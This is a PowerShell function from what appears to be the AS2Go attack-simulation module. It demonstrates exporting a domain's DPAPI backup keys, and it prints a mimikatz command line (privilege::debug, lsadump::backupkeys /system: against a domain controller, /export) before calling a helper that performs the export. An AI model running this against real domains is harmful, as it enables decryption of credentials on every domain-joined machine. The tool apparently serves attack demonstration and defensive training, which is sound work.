<#
.SYNOPSIS
Exports DPAPI master keys for credential recovery across the domain.

.DESCRIPTION
Extracts Domain DPAPI backup keys to demonstrate the ability to decrypt secrets protected by
the Data Protection API across all domain-joined machines, showing long-term credential compromise.

.EXAMPLE
Invoke-DPAPIMasterKeyExport
Runs the DPAPI master key export workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires domain administrator privileges and access to the DPAPI backup key store.

.COMPONENT
Category: Attack Function

.FUNCTIONALITY
Exports DPAPI master keys to decrypt secrets protected by DPAPI across all domain-joined machines.
#>
function Invoke-DPAPIMasterKeyExport {

    $info = Measure-FunctionRuntime -Begin

    If (-not $SkipClearHost) { Clear-Host }
    Write-AS2GoOutput -Type Header -M "Export DATA PROTECTION API master key"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    Write-AS2GoOutput -Type Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"

    Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
        -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
    Write-Host  ""

    If ($UnAttended) {
        $answer = $Script:Yes
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -eq $Script:Yes) {
        Export-DPAPIMasterKey
    }

    Measure-FunctionRuntime -End -Details $info
}
